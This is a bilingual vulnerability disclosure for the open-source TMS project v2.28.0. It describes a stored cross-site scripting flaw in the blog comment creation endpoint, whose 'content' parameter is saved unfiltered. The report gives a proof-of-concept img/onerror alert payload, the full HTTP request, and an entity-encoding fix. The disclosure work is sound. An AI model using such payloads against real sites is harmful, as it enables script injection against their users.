# TMS v2.28.0 /admin/blog/comment/create interface Cross-Site Scripting (XSS) vulnerability
>Source code repository：[https://github.com/xiweicheng/tms](https://github.com/xiweicheng/tms)
>
>Affected version: v2.28.0
>
>Official website：[https://gitee.com/xiweicheng/tms](https://gitee.com/xiweicheng/tms)
>
>releases：[https://github.com/xiweicheng/tms/releases/tag/v2.28.0](https://github.com/xiweicheng/tms/releases/tag/v2.28.0)

## 1、分析（analysis）

The `/admin/blog/comment/create` endpoint receives a `content` parameter.

/admin/blog/comment/create 接口接收 content 参数

src\main\java\com\lhjz\portal\controller\BlogController.java

<img width="1329" height="686" alt="Pasted image 20251203154030" src="https://github.com/user-attachments/assets/75533253-7d6a-4d5a-8fdd-5eca8c6f8825" />

The `content` parameter is not filtered at all and is directly inserted into the database, resulting in a Cross-Site Scripting (XSS) vulnerability.

content 参数未做任意过滤, 直接被插入数据库中, 导致存在XSS漏洞;

<img width="1697" height="770" alt="Pasted image 20251203154132" src="https://github.com/user-attachments/assets/07d9bb51-81c9-424a-bb46-4751df7aed1a" />


## 2、复现（replicate）

Injected payload: `<img src onerror=alert(1111)>`

插入payload `<img src onerror=alert(1111)>`

<img width="2240" height="979" alt="Pasted image 20251203152921" src="https://github.com/user-attachments/assets/f1c17dc3-1101-4c27-9617-7ce9e91168c0" />

The JavaScript code was executed.

js代码被执行
<img width="1457" height="993" alt="Pasted image 20251203152858" src="https://github.com/user-attachments/assets/0f9aa561-bc31-4d6f-83c9-d01ac44e79ac" />


``` http
POST /admin/blog/comment/create HTTP/1.1
Host: 192.168.0.62:8090
Content-Length: 213
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 Edg/142.0.0.0
Accept: */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.0.62:8090
Referer: http://192.168.0.62:8090/page/index.html
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Connection: keep-alive

basePath=http%3A%2F%2F192.168.0.62%3A8090%2Fpage%2Findex.html&id=1&users=&content=xss<img src onerror=alert(1111)>&contentHtml=<div class="markdown-body"/><p>aa</p>
</div>&uuid=5b7f4a06-26f7-410e-95ac-c644f88a9b45
```

## 3、修复方案（remediation plan）

Apply entity encoding (or HTML entity encoding) to parameters received from users.

对从用户处接收到的参数,使用是实体化编码
